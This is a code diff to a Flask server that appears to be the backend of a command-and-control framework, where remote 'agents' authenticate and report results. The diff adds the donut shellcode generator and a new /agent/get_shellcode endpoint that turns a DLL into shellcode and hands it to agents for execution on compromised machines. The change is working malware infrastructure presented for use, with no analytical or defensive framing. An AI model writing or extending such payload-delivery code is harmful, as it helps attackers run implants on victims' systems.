@@ -4,6 +4,7 @@ from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
 from aesgcm import encrypt, decrypt
 import json
+import donut
 
 
 ### some useful notes here ###
@@ -272,7 +273,13 @@ def get_results():
         print("[-] the agent has failed to authenticate")
         return jsonify({"status": "authentication failed"})
 
-
+@app.route('/agent/get_shellcode', methods=['GET'])
+def get_shellcode():
+    shellcode = donut.create(
+        file = "test.dll",
+        method = "IAmAGoodNoodle",
+    )
+    return shellcode
 
 @app.route("/")
 def login():
